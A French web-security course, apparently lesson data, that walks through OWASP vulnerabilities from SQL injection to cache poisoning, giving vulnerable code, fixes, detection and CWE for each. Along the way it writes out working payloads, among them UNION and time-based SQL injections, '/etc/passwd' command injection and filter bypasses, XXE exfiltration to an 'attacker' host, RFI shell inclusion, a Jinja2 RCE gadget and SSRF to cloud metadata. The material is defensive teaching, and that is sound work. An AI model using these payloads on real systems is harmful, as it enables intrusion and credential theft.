===LESSON===
KEY: appsec
TOPIC: appsec
TITLE: Sécurité applicative web : toutes les failles
ICON: 🛡️
INTRO: Ce cours couvre l'essentiel de la sécurité applicative web moderne, faille par faille, en s'appuyant sur l'OWASP Top 10, le Web Security Testing Guide (WSTG), HackTricks et PayloadsAllTheThings. Pour chaque vulnérabilité vous trouverez le mécanisme précis, du code vulnérable puis corrigé, l'impact réel, les techniques de détection, la remédiation et le CWE de référence. L'objectif est de comprendre *pourquoi* une faille existe afin de savoir la trouver, l'exploiter en environnement de test et surtout la prévenir.
---SECTION---
HEADING: Méthodologie et modèle de menace
BODY:
Avant d'étudier les failles une par une, il faut poser le cadre. La quasi-totalité des vulnérabilités web naissent d'une même erreur : **faire confiance à une donnée contrôlée par l'attaquant**. Toute donnée entrante (paramètre d'URL, corps de requête, en-tête HTTP, cookie, nom de fichier uploadé, message d'un autre service) est *non fiable* tant qu'elle n'a pas été validée et, surtout, correctement encodée pour le contexte où elle est utilisée.

Le principe fondateur est la séparation stricte entre **code** et **données**. Une injection (SQL, commande, LDAP, template…) se produit quand une donnée traverse une frontière et se fait interpréter comme du code par un interpréteur en aval. La défense universelle est donc : *ne jamais concaténer une donnée non fiable dans une chaîne interprétée* ; utiliser à la place des mécanismes paramétrés (requêtes préparées, API sûres) et un encodage adapté au contexte de sortie.

Trois autres piliers reviennent partout : la **validation en liste blanche** (n'accepter que ce qui correspond à un format attendu, plutôt que d'essayer d'interdire le « mauvais »), le **moindre privilège** (chaque composant n'a que les droits strictement nécessaires) et la **défense en profondeur** (plusieurs couches, aucune n'étant supposée parfaite). Le WSTG structure le test en catégories : gestion de configuration, authentification, autorisation, gestion de session, validation d'entrée, logique métier, côté client. Gardez cette grille en tête pour ne rien oublier.

**Remédiation :** adopter le réflexe « donnée non fiable = à valider + encoder + isoler », appliquer le moindre privilège partout, et tester chaque catégorie du WSTG systématiquement. CWE-707 (Improper Neutralization) et CWE-20 (Improper Input Validation).
---SECTION---
HEADING: Injection SQL
BODY:
L'injection SQL survient lorsqu'une donnée utilisateur est concaténée dans une requête SQL, permettant à l'attaquant d'en modifier la structure. C'est historiquement l'une des failles les plus graves : lecture de bases entières, modification de données, contournement d'authentification, voire exécution de commandes selon le SGBD.

Code vulnérable (PHP/PDO mal utilisé) :
```php
$q = "SELECT * FROM users WHERE name = '" . $_GET['u'] . "'";
$db->query($q);
// Entrée : ' OR '1'='1  →  renvoie tous les utilisateurs
// Entrée : ' UNION SELECT username, password FROM admins-- -
```

Correction par **requête préparée** (le pilote sépare code et données, la valeur n'est jamais interprétée) :
```php
$stmt = $db->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$_GET['u']]);
```

Variantes à connaître. **Blind SQLi** : l'application ne renvoie pas le résultat, mais un comportement observable. En *boolean-based* on infère bit à bit via des conditions vraies/fausses (`AND SUBSTRING(pass,1,1)='a'`) ; en *time-based* on mesure un délai (`AND SLEEP(5)` sur MySQL, `pg_sleep(5)` sur PostgreSQL, `WAITFOR DELAY '0:0:5'` sur MSSQL). **Second-order** : la charge est stockée sans danger (ex. à l'inscription) puis concaténée plus tard dans une autre requête où elle s'exécute ; les requêtes préparées doivent donc être utilisées *partout*, pas seulement au point d'entrée. **Injection dans ORDER BY** : on ne peut pas paramétrer un nom de colonne, donc `ORDER BY $col` est injectable ; il faut valider `$col` contre une **liste blanche** de colonnes autorisées. De même pour `LIMIT` ou les noms de tables.

**Détection :** injection de `'`, `"`, `--`, comportements différentiels booléens/temporels, outils comme sqlmap. Revue de code cherchant toute concaténation de chaîne dans une requête.

**Remédiation :** requêtes paramétrées / ORM avec binding systématique ; liste blanche pour les identifiants non paramétrables (colonnes, tri) ; compte SGBD à privilèges minimaux ; désactiver les messages d'erreur détaillés. CWE-89.
---SECTION---
HEADING: Injection NoSQL
BODY:
Les bases NoSQL (MongoDB, CouchDB, Redis…) ne sont pas immunisées : elles ont leurs propres syntaxes d'injection. Avec MongoDB, le danger classique vient des **opérateurs** (`$ne`, `$gt`, `$regex`, `$where`) injectés via des paramètres qui arrivent sous forme d'objets, typiquement quand un framework parse `user[$ne]=x` en `{ "$ne": "x" }`.

Code vulnérable (Node/Express + Mongoose) :
```js
// body-parser transforme {"user":{"$ne":null},"pass":{"$ne":null}}
User.findOne({ user: req.body.user, pass: req.body.pass });
// { "$ne": null } matche n'importe quel document → bypass d'authentification
```

L'opérateur `$where` est particulièrement dangereux car il évalue du **JavaScript côté serveur** : `{"$where": "this.pass == '' || sleep(5000)"}` permet une injection time-based, voire de l'exécution logique arbitraire.

Correction : forcer le typage des entrées et bannir les opérateurs. Ne jamais passer directement un objet issu du client comme critère de requête.
```js
if (typeof req.body.user !== 'string' || typeof req.body.pass !== 'string')
  return res.sendStatus(400);
User.findOne({ user: req.body.user, pass: req.body.pass });
```

**Détection :** tester `[$ne]`, `[$gt]`, `[$regex]` dans les paramètres, injections de payloads `$where`, réponses différentielles ou délais. NoSQLMap.

**Remédiation :** valider et **caster les types** (chaîne attendue = chaîne), interdire les clés commençant par `$` ou contenant `.` (sanitize, ex. `express-mongo-sanitize`), désactiver `$where`/l'exécution de JS serveur, requêtes paramétrées quand disponibles. CWE-943.
---SECTION---
HEADING: Injection de commande (OS command injection)
BODY:
Elle se produit quand une donnée utilisateur atteint un appel système exécuté par un shell. Le shell interprète alors des métacaractères (`;`, `|`, `&`, `&&`, `||`, `$(...)`, backticks, `\n`) pour enchaîner des commandes arbitraires — souvent avec les privilèges du serveur web.

Code vulnérable (Python) :
```python
import os
host = request.args["host"]
os.system(f"ping -c 1 {host}")   # host = "8.8.8.8; cat /etc/passwd"
```

Correction : ne jamais passer par un shell, utiliser une API qui prend un **tableau d'arguments** (pas d'interprétation shell), et valider l'entrée en liste blanche.
```python
import subprocess, ipaddress
ipaddress.ip_address(host)                 # rejette tout ce qui n'est pas une IP
subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
```

**Bypass de filtres** à connaître (pour comprendre l'insuffisance d'une blacklist) : insertion de caractères ignorés (`w'h'o'a'mi`, `who$@ami`), substitution de commande `$(...)`/backticks, encodage et variables (`$IFS` à la place des espaces : `cat$IFS/etc/passwd`), globbing (`/???/c?t /etc/passwd`), concaténation via variables shell. Ces techniques montrent qu'un filtrage par liste noire est presque toujours contournable.

**Détection :** injecter `;id`, `|id`, `$(id)`, tester des délais (`;sleep 5`), OOB via requêtes DNS/HTTP sortantes (blind). Revue de code : tout appel `system`, `exec`, `popen`, `Runtime.exec`, `child_process` avec concaténation.

**Remédiation :** éviter les appels shell ; API à arguments séparés (`shell=false`) ; validation stricte en liste blanche ; moindre privilège du processus ; jamais de blacklist comme unique défense. CWE-78.
---SECTION---
HEADING: Injection LDAP
BODY:
Les annuaires LDAP servent souvent à l'authentification. Une injection LDAP se produit quand une entrée est concaténée dans un **filtre de recherche**, dont la syntaxe utilise des parenthèses et des opérateurs (`&`, `|`, `!`, `*`, `=`). L'attaquant peut altérer la logique du filtre pour contourner l'authentification ou extraire des attributs.

Code vulnérable :
```java
String filter = "(&(uid=" + user + ")(userPassword=" + pass + "))";
// user = "*)(uid=*))(|(uid=*"  ou  pass = "*"  → le filtre matche tout
// user = "admin)(&)"  → injection d'un filtre toujours vrai
```

Le caractère `*` agit comme joker (utile pour énumérer/deviner des attributs caractère par caractère, façon blind), et une parenthèse mal placée casse la structure du filtre. Un mot de passe `*` avec une comparaison sur `userPassword` peut suffire à s'authentifier si la vérification est faite côté filtre.

Correction : **échapper** les métacaractères LDAP selon la RFC 4515 (`\28` pour `(`, `\29` pour `)`, `\2a` pour `*`, `\5c` pour `\`, `\00`), idéalement via une API dédiée.
```java
String safe = encodeForLDAP(user);   // ex. OWASP ESAPI / Encoder
String filter = "(&(uid=" + safe + ")(objectClass=person))";
```

**Détection :** injecter `*`, `)`, `(`, `|`, `&` dans les champs d'authentification/recherche et observer bypass ou changements de résultats.

**Remédiation :** échappement des filtres (RFC 4515) et des DN, liste blanche des caractères, ne jamais authentifier uniquement par filtre (utiliser un *bind* avec le mot de passe), moindre privilège du compte de service LDAP. CWE-90.
---SECTION---
HEADING: Injection XPath
BODY:
XPath sert à interroger des documents XML, parfois utilisés comme base d'authentification ou de données. Comme SQL et LDAP, un filtre XPath construit par concaténation est injectable, avec une syntaxe proche (`'`, `or`, `and`, fonctions `string-length`, `substring`).

Code vulnérable :
```python
expr = "//user[name/text()='%s' and pass/text()='%s']" % (u, p)
# u = "' or '1'='1"  → sélectionne le premier utilisateur, bypass d'auth
```

Comme XPath 1.0 n'a pas de commentaires et un seul « namespace » de données, la **blind XPath injection** est puissante : on peut naviguer tout le document via des conditions booléennes (`substring(//user[1]/pass,1,1)='a'`) et reconstruire l'intégralité du XML, y compris les nœuds voisins — il n'existe pas d'équivalent des permissions par table.

Correction : requêtes XPath **paramétrées** (variables liées) et non concaténées.
```java
XPathExpression e = xpath.compile("//user[name=$n and pass=$p]");
// binder $n et $p via un XPathVariableResolver, jamais de string building
```

**Détection :** injecter `'`, `"`, `or 1=1`, `and 1=2` et observer bypass/différentiel booléen. WSTG-INPV-09.

**Remédiation :** variables liées / API paramétrée, échappement des quotes si concaténation inévitable, validation en liste blanche, ne pas stocker de secrets dans des fichiers XML interrogés. CWE-643.
---SECTION---
HEADING: Injection de templates côté serveur (SSTI)
BODY:
Les moteurs de templates (Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars…) mélangent HTML et expressions. Le SSTI survient quand une entrée utilisateur est **interprétée comme un template** au lieu d'être passée en donnée. Selon le moteur, cela mène de la fuite de données à l'**exécution de code arbitraire** (RCE) via l'accès aux objets/classes du langage.

Code vulnérable (Flask/Jinja2) :
```python
return render_template_string("Bonjour " + request.args["name"])
# name = {{7*7}} → "Bonjour 49"  (preuve d'évaluation)
# name = {{ ''.__class__.__mro__[1].__subclasses__() ... }} → RCE Python
```

**Fingerprint des moteurs** : envoyez des sondes polyglottes et observez le résultat. `${7*7}` et `#{7*7}` visent Freemarker/Ruby/Velocity ; `{{7*7}}` visent Jinja2/Twig/Handlebars/Angular. Pour distinguer Jinja2 de Twig : `{{7*'7'}}` donne `7777777` en Jinja2 (Python) mais `49` en Twig (PHP). `${7*7}` évalué = Freemarker/Thymeleaf/JSP EL ; `#{7*7}` = Ruby/Slim. `<%= 7*7 %>` = ERB. Ce diagramme de décision (`{{7*7}}` puis `{{7*'7'}}`) est celui de PortSwigger/HackTricks.

Correction : ne jamais construire un template à partir d'entrées ; passer les données en **contexte** d'un template statique, et si l'utilisateur doit fournir du texte riche, utiliser un moteur en **sandbox** avec logique restreinte.
```python
return render_template("hello.html", name=request.args["name"])
```

**Détection :** sondes mathématiques `{{7*7}}`, `${7*7}`, `#{7*7}` ; escalade vers les gadgets d'accès aux classes propres à chaque moteur ; tplmap.

**Remédiation :** séparer template et données, sandbox (Jinja2 `SandboxedEnvironment`, mais attention aux évasions connues), liste blanche de champs, ne pas exposer d'objets sensibles au contexte. CWE-1336 (et CWE-94).
---SECTION---
HEADING: XXE (XML External Entity)
BODY:
Un parseur XML qui traite les **entités externes** permet à un document malveillant de lire des fichiers locaux, d'effectuer des requêtes SSRF, ou de provoquer un déni de service. La cause racine est une configuration de parseur non durcie.

Payload de lecture de fichier :
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<r>&x;</r>
```

Variante **blind / OOB** : quand le contenu n'est pas reflété, on exfiltre via des entités de paramètre et une DTD externe hébergée par l'attaquant (`<!ENTITY % dtd SYSTEM "http://attacker/e.dtd">`) qui renvoie les données par une requête HTTP. Le vecteur SSRF (`SYSTEM "http://169.254.169.254/..."`) permet d'atteindre des services internes.

Le **billion laughs** (entity expansion) est un DoS : des entités s'imbriquant exponentiellement saturent la mémoire.

Correction : **désactiver les DTD et entités externes** dans le parseur.
```java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setExpandEntityReferences(false);
```
En Python, préférer `defusedxml`. Attention aussi aux formats basés sur XML (DOCX, SVG, SOAP, SAML).

**Détection :** injecter une entité pointant vers un serveur contrôlé (Burp Collaborator), tester `file://`, entités paramétrées, expansion.

**Remédiation :** désactiver DOCTYPE/entités externes/expansion, `defusedxml`, limiter la taille d'entrée, WAF en défense secondaire. CWE-611 (et CWE-776 pour le billion laughs).
---SECTION---
HEADING: Désérialisation non sûre
BODY:
Désérialiser des données non fiables peut instancier des objets arbitraires et déclencher des « gadget chains » aboutissant à l'exécution de code. Le problème touche les sérialiseurs *natifs* qui reconstruisent des objets avec leur type et exécutent des méthodes magiques (`__wakeup`, `readObject`, `__reduce__`).

Java (`ObjectInputStream.readObject`) et .NET (`BinaryFormatter`) sont exploitables via des chaînes de gadgets (ysoserial). PHP `unserialize()` déclenche `__wakeup`/`__destruct` sur des classes présentes (POP chains). Python `pickle` est de conception dangereuse :
```python
import pickle
pickle.loads(request.data)      # __reduce__ peut exécuter os.system(...)
```
Un objet `pickle` peut définir `__reduce__` renvoyant `(os.system, ("cmd",))`, exécuté à la désérialisation.

Correction : ne **jamais désérialiser de données non fiables avec un format natif**. Utiliser un format **de données** (JSON, avec schéma) et mapper explicitement vers vos objets.
```python
import json
data = json.loads(request.data)   # ne produit que des types primitifs
# valider ensuite chaque champ contre un schéma
```
Si un format binaire typé est indispensable, signer/chiffrer le blob (HMAC) et restreindre par liste blanche les classes autorisées (ex. `ObjectInputFilter` en Java, `TypeNameHandling` off en .NET, JSON avec validation).

**Détection :** repérer les points de désérialisation (`readObject`, `unserialize`, `pickle.loads`, `yaml.load` non-safe, `BinaryFormatter`) recevant des données externes ; magic bytes (`AC ED` Java, `rO0` en base64) ; ysoserial pour tester.

**Remédiation :** privilégier JSON + validation de schéma ; intégrité (HMAC) et liste blanche de types si sérialisation objet nécessaire ; bannir `pickle`/`BinaryFormatter`/`yaml.load` sur entrée externe. CWE-502.
---SECTION---
HEADING: Injection de code (eval et assimilés)
BODY:
Distincte de l'injection de commande OS, l'injection de code fait interpréter une entrée comme du code **dans le langage de l'application** via `eval`, `exec`, `Function`, `new Function`, `setTimeout("string")`, `assert`, ou des includes dynamiques. L'impact est une RCE complète dans le contexte du processus.

Code vulnérable (Node.js) :
```js
app.get('/calc', (req, r) => r.send(String(eval(req.query.expr))));
// expr = process.mainModule.require('child_process').execSync('id')
```
En PHP, `eval()`, `assert()` avec argument dynamique, `preg_replace` avec le modificateur `/e` (déprécié), ou `create_function` sont autant de vecteurs. En Python, `eval`/`exec`/`compile` sur entrée utilisateur.

Correction : supprimer l'évaluation dynamique. Pour évaluer une expression arithmétique fournie par l'utilisateur, utiliser un **parseur restreint** plutôt qu'`eval`.
```js
// Parser sûr d'expressions numériques, sans accès au runtime
const { evaluate } = require('mathjs');
r.send(String(evaluate(req.query.expr, {})));   // pas d'accès à process
```

**Détection :** grep des primitives d'évaluation dynamique recevant des données externes ; test avec des expressions qui prouvent l'exécution.

**Remédiation :** éliminer `eval`/`exec`/`Function` sur entrée non fiable ; remplacer par des parseurs dédiés et sandboxés ; validation stricte ; CSP côté client pour limiter l'`eval` dans le navigateur. CWE-94 (et CWE-95).
---SECTION---
HEADING: Cross-Site Scripting (XSS)
BODY:
Le XSS injecte du JavaScript qui s'exécute dans le navigateur d'autres utilisateurs, permettant vol de session, actions au nom de la victime, keylogging, défiguration. Il existe trois familles principales, plus une variante mutée.

**Reflected** : la charge est renvoyée immédiatement dans la réponse (ex. un paramètre de recherche non encodé) et nécessite un lien piégé. **Stored** : la charge est persistée (commentaire, profil) et frappe tout visiteur — la plus grave. **DOM-based** : l'injection se fait entièrement côté client, du fait d'un *sink* dangereux alimenté par une *source* contrôlée, sans que le serveur voie jamais la charge.

Code vulnérable et corrigé (serveur) :
```js
res.send("Résultats pour : " + req.query.q);            // reflected XSS
res.send("Résultats pour : " + escapeHtml(req.query.q)); // encodage HTML
```
DOM XSS typique et correction :
```js
el.innerHTML = location.hash.slice(1);   // sink dangereux
el.textContent = location.hash.slice(1); // pas d'interprétation HTML
```

Le **mXSS** (mutation XSS) exploite le fait que le HTML nettoyé est *re-parsé* par le navigateur, qui « mute » le markup (ex. via `innerHTML`, `noscript`, namespaces SVG/MathML) et fait réapparaître un vecteur que le sanitizer croyait neutralisé. C'est pourquoi il faut un sanitizer robuste et à jour (DOMPurify) plutôt qu'un filtrage maison.

L'encodage doit correspondre au **contexte de sortie** : corps HTML (encodage d'entités), attribut (guillemets + encodage), JavaScript, URL, CSS — chacun a ses règles. Une seule stratégie d'encodage ne suffit pas.

**Détection :** injecter `"><img src=x onerror=alert(1)>`, sondes par contexte, revue des sinks (`innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`). DOM Invader, scanners.

**Remédiation :** encodage **contextuel** en sortie, frameworks à échappement automatique (React/Angular/Vue) sans contourner leurs garde-fous, sanitizer robuste pour le HTML riche (DOMPurify), `HttpOnly` sur les cookies, et **CSP** en défense en profondeur. CWE-79.
---SECTION---
HEADING: CSRF (Cross-Site Request Forgery)
BODY:
Le CSRF force le navigateur d'une victime authentifiée à émettre une requête *changeant l'état* (virement, changement d'email/mot de passe) à son insu, en exploitant l'envoi automatique des cookies par le navigateur. L'attaquant n'a pas besoin de lire la réponse : l'action suffit.

Attaque type : une page piège soumet automatiquement un formulaire vers la banque ; comme le cookie de session part avec la requête, le serveur l'exécute.
```html
<form action="https://banque/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="1000">
</form><script>document.forms[0].submit()</script>
```

Correction principale : un **jeton anti-CSRF** imprévisible, lié à la session, requis et vérifié pour chaque requête d'écriture (pattern synchronizer token).
```python
if not hmac.compare_digest(session_token, form_token):
    abort(403)
```

Défense complémentaire majeure : l'attribut de cookie **`SameSite`** (`Lax` par défaut sur les navigateurs modernes, `Strict` pour les actions sensibles) empêche l'envoi cross-site du cookie. Attention : `SameSite` seul ne couvre pas tous les cas (sous-domaines, méthode GET avec effet de bord, clients non-navigateur), d'où l'intérêt de combiner jeton + `SameSite`. Vérifier aussi l'en-tête `Origin`/`Referer` pour les requêtes sensibles.

**Détection :** rejouer une requête d'écriture sans le jeton / avec un jeton d'une autre session ; absence de `SameSite` ; méthodes GET modifiant l'état.

**Remédiation :** jetons anti-CSRF vérifiés côté serveur, cookies `SameSite`, vérification d'`Origin`, pas d'effet de bord sur GET, ré-authentification pour les actions critiques. CWE-352.
---SECTION---
HEADING: SSRF (Server-Side Request Forgery)
BODY:
Le SSRF fait émettre au serveur des requêtes vers des destinations choisies par l'attaquant. Parce que la requête part *depuis l'infrastructure*, elle atteint des ressources internes normalement inaccessibles : services d'administration, bases, et surtout les **métadonnées cloud**.

Code vulnérable :
```python
url = request.args["url"]
return requests.get(url).text   # url = http://169.254.169.254/latest/meta-data/
```

Cibles et techniques clés. **Métadonnées cloud** : `http://169.254.169.254/` (AWS IMDSv1, vol de credentials IAM temporaires), équivalents GCP et Azure. **Schémas alternatifs** : `file://` (lecture locale), `gopher://` (forger des paquets bruts TCP, ex. requêtes Redis/SMTP/HTTP arbitraires — vecteur très puissant), `dict://`. **Contournements de filtres** : représentations d'IP (décimal `2130706433`, octal, IPv6 `[::1]`, `127.0.0.1.nip.io`), redirections HTTP, et surtout le **DNS rebinding** : un domaine dont la résolution change entre la vérification et la requête réelle (TTL très court) pour passer d'une IP publique autorisée à `127.0.0.1` (TOCTOU sur la résolution DNS).

Correction : liste blanche stricte des destinations, validation *après* résolution DNS, interdiction des IP privées/loopback/link-local, et blocage des redirections.
```python
import ipaddress, socket
host = urlparse(url).hostname
ip = ipaddress.ip_address(socket.gethostbyname(host))
if ip.is_private or ip.is_loopback or ip.is_link_local: abort(400)
# + allowlist de domaines, allow_redirects=False, résoudre puis se connecter à cette IP
```

**Détection :** paramètres prenant une URL/host, webhooks, importeurs, générateurs de PDF/miniatures ; sonde OOB (Collaborator) ; test des IP internes et métadonnées.

**Remédiation :** liste blanche de domaines/protocoles, bannir IP privées y compris après redirection et re-résolution (contre le rebinding), désactiver les schémas inutiles, **IMDSv2** obligatoire côté AWS, egress filtering réseau. CWE-918.
---SECTION---
HEADING: Path traversal, LFI et RFI
BODY:
Ces failles manipulent des chemins de fichiers construits à partir d'entrées utilisateur. Le **path traversal** utilise `../` pour sortir du répertoire prévu et lire/écrire des fichiers arbitraires. La **LFI** (Local File Inclusion) inclut un fichier local dans l'exécution ; la **RFI** (Remote File Inclusion) inclut un fichier distant, menant à la RCE.

Code vulnérable :
```php
include($_GET["page"] . ".php");         // RFI/LFI
readfile("/var/www/files/" . $_GET["f"]); // f = ../../etc/passwd
```

Techniques : `../` (et variantes encodées `%2e%2e%2f`, double-encodage `%252e`, `....//`), chemins absolus, le **null byte** `%00` sur d'anciens runtimes pour tronquer l'extension, les **wrappers PHP** (`php://filter/convert.base64-encode/resource=` pour exfiltrer le source, `data://`, `expect://`), et le **log poisoning** (injecter du PHP dans un log puis l'inclure). En RFI, `page=http://attacker/shell.txt` exécute du code distant si `allow_url_include` est actif.

Correction : ne jamais concaténer l'entrée dans un chemin ; **résoudre le chemin canonique** et vérifier qu'il reste dans le répertoire autorisé ; mieux, indirection par identifiant (liste blanche).
```php
$base = realpath("/var/www/files");
$path = realpath($base . "/" . basename($_GET["f"]));
if ($path === false || strpos($path, $base) !== 0) { http_response_code(403); exit; }
readfile($path);
```

**Détection :** injecter `../../etc/passwd`, `..%2f`, wrappers PHP, chemins absolus ; observer contenu de fichiers ou erreurs de chemin.

**Remédiation :** liste blanche / mapping par ID plutôt que chemins libres, canonicalisation + confinement (`realpath` sous une racine), désactiver `allow_url_include`/`allow_url_fopen`, `basename`, moindre privilège du FS. CWE-22 (traversal), CWE-98 (RFI/LFI).
---SECTION---
HEADING: Upload de fichiers dangereux
BODY:
Un upload mal contrôlé permet de déposer un webshell exécutable, d'écraser des fichiers, ou de stocker du contenu actif servi aux autres utilisateurs. Le risque maximal est atteint quand le fichier est enregistré dans un répertoire *exécutable* par le serveur.

Code vulnérable :
```php
move_uploaded_file($_FILES["f"]["tmp_name"], "uploads/" . $_FILES["f"]["name"]);
// dépôt de shell.php exécuté ensuite en http://site/uploads/shell.php
```

**Bypass classiques** à connaître : extensions alternatives interprétées (`.php5`, `.phtml`, `.phar`, `.pht`), double extension (`shell.php.jpg` selon la config Apache/`AddHandler`), casse (`.PhP`), null byte, faux `Content-Type`, et **magic bytes** : préfixer un fichier PHP par les octets d'une image (`GIF89a;`) pour tromper une vérification de signature. Les **SVG** sont un piège fréquent : ce sont des documents XML qui peuvent contenir du JavaScript (`<svg onload=...>`) — stored XSS — voire des entités XXE. Les archives (zip slip) peuvent aussi traverser des chemins à l'extraction.

Correction : valider par **liste blanche d'extensions et de types**, générer un **nom aléatoire**, stocker **hors racine web** ou sur un domaine sans exécution, et empêcher toute exécution.
```php
$allowed = ["jpg"=>"image/jpeg","png"=>"image/png"];
$ext = strtolower(pathinfo($_FILES["f"]["name"], PATHINFO_EXTENSION));
$mime = mime_content_type($_FILES["f"]["tmp_name"]);
if (!isset($allowed[$ext]) || $allowed[$ext] !== $mime) exit;
$name = bin2hex(random_bytes(16)) . "." . $ext;   // + ré-encodage de l'image
move_uploaded_file($_FILES["f"]["tmp_name"], "/data/uploads/$name");
```

**Détection :** tenter des extensions actives, doubles extensions, magic bytes, SVG avec script, vérifier si l'upload est servi et exécuté.

**Remédiation :** liste blanche stricte (extension + MIME + magic bytes cohérents), renommage aléatoire, stockage non exécutable / CDN séparé, `Content-Disposition: attachment`, ré-encodage des images, désactiver l'exécution dans le dossier, antivirus. CWE-434.
---SECTION---
HEADING: Open redirect
BODY:
Une redirection ouverte laisse l'utilisateur contrôler la destination d'une redirection, ce qui sert au **phishing** (le lien commence par votre domaine de confiance mais aboutit chez l'attaquant), au vol de jetons OAuth (via `redirect_uri`), et parfois à chaîner d'autres attaques (SSRF, XSS via `javascript:`).

Code vulnérable :
```java
response.sendRedirect(request.getParameter("next"));
// next = https://evil.example  →  redirection hors site
```

Contournements de filtres naïfs : `//evil.com` (URL protocole-relative interprétée comme un hôte), `https:evil.com`, `/\evil.com`, backslashes, `@` dans l'autorité (`https://trusted.com@evil.com`), sous-domaines trompeurs (`trusted.com.evil.com`), et `javascript:`/`data:` menant à du XSS. Un simple « contient trusted.com » est donc insuffisant.

Correction : n'autoriser que des destinations **internes**, idéalement via une table d'indirection (identifiant → URL) ou en n'acceptant que des chemins relatifs validés.
```java
String next = request.getParameter("next");
if (next == null || !next.startsWith("/") || next.startsWith("//")
      || next.startsWith("/\\")) next = "/";
response.sendRedirect(next);   // uniquement chemins internes
```

**Détection :** paramètres `next`, `url`, `return`, `redirect`, `dest`, `continue`, `redirect_uri` ; tester domaines externes et bypass.

**Remédiation :** liste blanche d'URL/domaines ou redirections relatives uniquement, validation de l'autorité complète (pas un simple `contains`), confirmation utilisateur pour les redirections externes, `redirect_uri` OAuth en correspondance exacte. CWE-601.
---SECTION---
HEADING: Injection CRLF et response splitting
BODY:
Les caractères retour chariot/saut de ligne (`\r\n`, `%0d%0a`) séparent les en-têtes HTTP et la ligne vide qui précède le corps. Si une donnée utilisateur est insérée dans un en-tête de réponse sans filtrage, l'attaquant peut **injecter de nouveaux en-têtes** voire scinder la réponse (response splitting), aboutissant à du cache poisoning, du XSS, ou la pose de cookies.

Code vulnérable :
```python
resp.headers["Location"] = "/p?lang=" + request.args["lang"]
# lang = fr%0d%0aSet-Cookie:%20admin=1
```

Le même problème existe côté SMTP (**header injection** dans les emails : injection de `Bcc:`/`To:` via un champ non filtré) et dans les logs (**log injection / forging** en insérant des `\n` pour falsifier des lignes de journal).

Correction : ne jamais placer d'entrée brute dans un en-tête ; les frameworks modernes rejettent souvent `\r`/`\n`, mais il faut valider explicitement.
```python
lang = request.args["lang"]
if not re.fullmatch(r"[a-z]{2}", lang):   # liste blanche stricte
    abort(400)
resp.headers["Location"] = f"/p?lang={lang}"
```

**Détection :** injecter `%0d%0a` (et variantes) dans les paramètres reflétés dans des en-têtes ; observer de nouveaux en-têtes.

**Remédiation :** supprimer/rejeter CR et LF dans toute valeur d'en-tête, validation en liste blanche, utiliser les API du framework qui encodent les en-têtes, encoder les entrées dans les logs. CWE-113 (et CWE-93).
---SECTION---
HEADING: Injection d'en-tête Host
BODY:
Beaucoup d'applications réutilisent l'en-tête `Host` (contrôlé par le client) pour générer des URL absolues : liens de **réinitialisation de mot de passe**, ressources, redirections. Un `Host` falsifié peut alors empoisonner ces URL et détourner le flux, ou empoisonner un cache.

Scénario classique — password reset poisoning :
```python
link = f"https://{request.host}/reset?token={token}"   # Host contrôlé
# Attaquant force Host: evil.com → la victime reçoit un lien vers evil.com
# En cliquant, elle envoie son token de reset à l'attaquant
```

Autres vecteurs : contournement de contrôles d'accès basés sur le Host, routing interne, empoisonnement de cache. Les en-têtes annexes `X-Forwarded-Host` et `X-Forwarded-Server` sont souvent traités et tout aussi dangereux.

Correction : ne jamais faire confiance au `Host` entrant ; utiliser une **liste blanche de domaines autorisés** et une base d'URL configurée côté serveur.
```python
ALLOWED = {"app.example.com"}
if request.host not in ALLOWED: abort(400)
BASE = "https://app.example.com"
link = f"{BASE}/reset?token={token}"
```

**Détection :** modifier `Host`/`X-Forwarded-Host` et observer s'il apparaît dans des réponses, emails de reset, redirections ou cache.

**Remédiation :** liste blanche stricte du `Host`, URL de base fixée en configuration, ignorer les en-têtes `X-Forwarded-*` non fiables, jetons de reset à usage unique et courte durée. CWE-644.
---SECTION---
HEADING: HTTP Request Smuggling
BODY:
Le request smuggling exploite un **désaccord entre deux serveurs** de la chaîne (front-end/proxy et back-end) sur la frontière des requêtes, généralement via les en-têtes `Content-Length` (CL) et `Transfer-Encoding: chunked` (TE). Un serveur se fie à CL, l'autre à TE : une requête « contrebande » est alors préfixée aux requêtes légitimes des autres utilisateurs.

Les variantes classiques sont **CL.TE**, **TE.CL** et **TE.TE** (obfuscation de l'en-tête TE pour qu'un seul des deux le prenne en compte).

Impacts : contournement de contrôles de sécurité front-end, empoisonnement de cache, capture de requêtes d'autres utilisateurs (vol de cookies/CSRF tokens), escalade vers XSS stocké côté proxy. Les variantes récentes incluent le smuggling H2.CL/H2.TE lors du downgrade HTTP/2 vers HTTP/1.1.

Correction/défense (surtout côté infrastructure) : rejeter les requêtes contenant **à la fois** CL et TE, normaliser/refuser les en-têtes ambigus, et utiliser **HTTP/2 de bout en bout** sans rétro-conversion.

**Détection :** techniques time-based et differential-response (extension Burp « HTTP Request Smuggler »), sondes CL.TE/TE.CL.

**Remédiation :** front et back doivent interpréter la longueur de manière identique, rejeter CL+TE simultanés et les TE malformés, HTTP/2 end-to-end, mettre à jour proxies/serveurs. CWE-444.
---SECTION---
HEADING: Web cache poisoning et cache deception
BODY:
Un cache (CDN, reverse proxy) stocke des réponses pour les servir à plusieurs utilisateurs. Deux abus opposés existent. Le **cache poisoning** : l'attaquant fait mettre en cache une réponse malveillante (via une entrée non incluse dans la *clé* de cache mais influençant la réponse — en-tête non-keyed comme `X-Forwarded-Host`), puis servie à toutes les victimes. La **cache deception** : l'attaquant piège une victime pour qu'une page *sensible et personnalisée* (ex. `/account`) soit mise en cache puis lue par lui.

Cache deception — principe : `https://site/account/wallet.css`. L'application ignore le suffixe et renvoie la page compte (données de la victime), mais le CDN, voyant `.css`, met la réponse en cache par extension ; l'attaquant récupère ensuite la version cachée contenant les données privées.

Correction : aligner strictement la **clé de cache** sur *tout* ce qui influence la réponse, ne pas faire varier la réponse selon des en-têtes non-keyed, et ne **jamais mettre en cache** de contenu authentifié/personnalisé.
```
